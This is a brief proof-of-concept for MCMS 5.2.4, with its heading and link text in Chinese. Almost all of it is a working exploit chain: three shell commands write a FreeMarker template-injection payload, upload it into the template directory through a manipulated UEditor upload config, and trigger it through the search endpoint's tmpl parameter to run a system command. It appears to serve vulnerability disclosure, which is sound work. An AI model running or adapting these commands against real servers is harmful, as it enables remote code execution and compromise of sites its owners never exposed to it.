### POC (测试版本: 5.2.4)

```shell
echo "<#assign value="freemarker.template.utility.Execute"?new()>${value("open -a calculator")}" > /path/to/your/1.txt & 
curl --location 'http://ip:port/static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7BfilePathFormat%3A%27%2Ftemplate%2F1%2Fdefault%2Fevil%27%2CvideoUrlPrefix%3A%27%27%2CfileManagerListPath%3A%27%27%2CimageMaxSize%3A204800000%2CvideoMaxSize%3A204800000%2CfileMaxSize%3A204800000%2CfileUrlPrefix%3A%27%27%2CimageUrlPrefix%3A%27%27%2CimagePathFormat%3A%27%2Fupload%2F%24%7BappId%7D%2Fcms%2Fcontent%2Feditor%2F%257Btime%257D%27%2CvideoPathFormat%3A%27%2Fupload%2F%24%7BappId%7D%2Fcms%2Fcontent%2Feditor%2F%257Btime%257D%27%7D&action=uploadfile' \
--form 'upload=@"/path/to/your/1.txt"' &
curl --location 'http://ip:port/mcms/search?tmpl=evil.txt'
```

具体可参考：[MCMS SSTI To RCE](https://racerz.notion.site/MCMS-SSTI-To-RCE-ea6feec00405494c8a4406165eb557c1?pvs=4)

源码：https://gitee.com/mingSoft/MCMS/tree/5.2.4

